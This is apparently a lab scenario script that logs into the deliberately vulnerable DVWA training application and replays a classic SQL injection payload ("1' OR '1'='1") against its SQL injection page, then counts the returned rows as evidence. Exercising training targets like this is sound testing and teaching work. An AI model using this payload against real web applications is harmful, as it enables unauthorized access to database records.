#!/bin/sh
# Submit one controlled SQLi payload to DVWA and record the returned rows.
set -eu
. /opt/scenarios/lib.sh

new_run sqli
login_as_admin_low
cookie_file="$RUN_DIR/cookies.txt"
payload="1' OR '1'='1"

dvwa_curl --fail --silent --show-error --cookie "$cookie_file" -G \
    --data-urlencode "id=$payload" --data-urlencode 'Submit=Submit' \
    "$DVWA_URL/vulnerabilities/sqli/" -o "$RUN_DIR/sqli-result.html"

rows="$(grep -o 'First name:' "$RUN_DIR/sqli-result.html" | wc -l | tr -d ' ')"
printf '%s\n' "payload=$payload" "returned_rows=$rows" > "$RUN_DIR/summary.txt"

if [ "$rows" -lt 2 ]; then
    echo 'The SQLi payload did not return multiple rows.' >&2
    exit 1
fi

printf '%s\n' "SQLi replay returned $rows rows. Evidence: $RUN_DIR"
